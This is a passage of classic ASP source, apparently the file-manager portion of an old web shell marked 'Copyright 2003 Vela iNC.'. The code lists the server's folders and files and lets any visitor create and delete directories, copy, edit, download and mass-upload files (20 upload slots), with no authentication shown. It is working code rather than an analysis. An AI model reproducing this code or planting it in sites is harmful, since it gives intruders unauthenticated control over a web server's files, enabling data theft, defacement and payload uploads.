' ---View Tree Begins Here
	Response.Write "<table Cellpading=2 width=75% bgcolor=#505050 ><tr><td valign=top width=50% bgcolor=#303030 >Folders:<BR><BR>"
fo=0
	Response.Write "<font face=wingdings color=Gray >0</font> <FONT COLOR=#c8c8c8><span style='cursor: hand;' OnClick=""getit('..')"">..</span></FONT><BR>"

For each fold in folder.SubFolders '-->FOLDERz
fo=fo+1
	Response.Write "<font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick=""getit('" & fold.name & "')"">" & fold.name & "</span></FONT><BR>"
Next
%>
<BR><center><form method=post action="<%=Request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=MyPath%>">
<table bgcolor=#505050 cellspacing=4><tr><td>
<font face=arial size=-1 title="Create and Delete folders by entering their names here manually.">Directory:</td></tr>
<tr><td align=right ><input type=text size=20 name=DirName><BR>
<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>
</tr></td></table></form>
<%
Response.Write "<BR></td><td valign=top width=50% bgcolor=#303030 >Files:<BR><BR>"
Response.Flush
%>
	<form method=post name=frmCopySelected action="<%=Request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=MyPath%>">
<%
	Response.write "<center><select name=Fname size=" & fi+3 & " style=""background-color: rgb(48,48,48); color: rgb(210,210,210)"">"
For each file in folder.Files '-->FILEz
	Response.Write "<option value=""" & file.name & """>&nbsp;&nbsp;" & file.name & " -- [" & Int(file.size/1024)+1 & " kb]</option>"
Next
	Response.write "</select>"
	Response.write "<br><input type=submit name=cmd value=""   Copy   ""><input type=submit name=cmd value=""Edit/Create""><input type=submit name=cmd value=Download>"
%>
	</form>
<%
	Response.Write "<BR></td></tr><tr><td align=center ><B>Listed: " & fo & "</b></td><td align=center ><b>Listed: " & fi & "</b></td></tr></table><BR>"
' ---View Tree Ends Here
' ---Upload Routine starts here
%>
	<form method="post" ENCTYPE="multipart/form-data" action="<%=Request.Servervariables("SCRIPT_NAME")%>?upload=@&txtpath=<%=MyPath%>">
<table bgcolor="#505050" cellpadding="8">
  <tr>
    <td bgcolor=#303030 valign="bottom"><font size=+1 face=wingdings color=Gray >2</font><font face="Arial" size=-2 color="#ff8300"> SELECT FILES TO UPLOAD:<br>
    <input TYPE="FILE" SIZE="53" NAME="FILE1"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE2"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE3"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE4"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE5"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE6"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE7"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE8"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE9"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE10"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE11"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE12"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE13"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE14"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE15"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE16"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE17"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE18"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE19"><BR>
	<input TYPE="FILE" SIZE="53" NAME="FILE20"><BR>

	&nbsp;&nbsp;<input TYPE="submit" VALUE="Upload !" name="Upload" TITLE="If you recieve an error while uploading, then most likely you do not have write access to disk !!">
	</font></td>
  </tr>
</table>
<BR>
<table bgcolor="#505050" cellpadding="6">
  <tr>
    <td bgcolor="#000000" valign="bottom"><font face="Arial" size="-2" color=gray>NOTE FOR UPLOAD -
    YOU MUST HAVE VBSCRIPT v5.0 INSTALLED ON YOUR WEB SERVER&nbsp; FOR THIS LIBRARY TO
    FUNCTION CORRECTLY. YOU CAN OBTAIN IT FREE FROM MICROSOFT WHEN YOU INSTALL INTERNET
    EXPLORER 5.0 OR LATER. WHICH IS, MOST LIKELY, ALREADY INSTALLED.</font></td>
  </tr>
</table>
	</form>
<%
' ---Upload Routine stops here
%>

</font><HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=1 face=arial>[ System: <%=now%> ]</font></p><BR>
</body></html>
